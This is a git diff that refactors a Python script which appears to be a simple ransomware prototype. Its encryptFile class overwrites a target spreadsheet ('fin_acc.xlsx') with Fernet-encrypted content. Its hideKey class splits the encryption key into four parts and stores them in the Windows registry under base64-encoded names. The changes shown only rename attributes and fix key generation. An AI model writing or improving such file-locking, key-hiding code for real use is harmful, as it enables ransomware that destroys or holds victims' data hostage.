@@ -36,9 +36,10 @@ class hideKey():
 
         for num in range(4):
             name = base64.b64encode(str(num).encode())
+            value = self.adj_key[num]
             hideKey.set_reg(
                 name=name.decode(),
-                value=self.adj_key[num].decode(),
+                value=value.decode(),
                 REG_PATH=self.REG_PATH,
             )
 
@@ -46,15 +47,15 @@ class encryptFile():
 
     def __init__(self, filename: str, key: str):
         self.filename = filename
-        self.__key = key
+        self.key = key
 
     def run(self):
 
-        self.__fernet_class = Fernet(self.__key)
+        self.fernet_class = Fernet(self.key)
 
         with open(self.filename, "rb") as file:
             data = file.read()
-            enc_d = self.__fernet_class.encrypt(data)
+            enc_d = self.fernet_class.encrypt(data)
 
         with open(self.filename, "wb") as file:
             file.write(enc_d)
@@ -63,8 +64,7 @@ class encryptFile():
 class keyGenerator():
 
     def __init__(self) -> None:
-        self.key = keyGenerator.gen_key()
-        self.adj_key = keyGenerator.adj_key(keyGenerator.gen_key().decode())
+        pass
 
     @staticmethod
     def gen_key() -> str:
@@ -74,7 +74,6 @@ class keyGenerator():
     def adj_key(key) -> list:
 
         _adj_key = []
-        key = keyGenerator.gen_key()
         n = 4
         lenght = len(key)
         chars = int(lenght/n)
@@ -103,7 +102,7 @@ if __name__ == "__main__":
     # if is_admin():
     encryptFile(
         filename="fin_acc.xlsx",
-        key=key
+        key=key,
     ).run()
 
     hideKey(
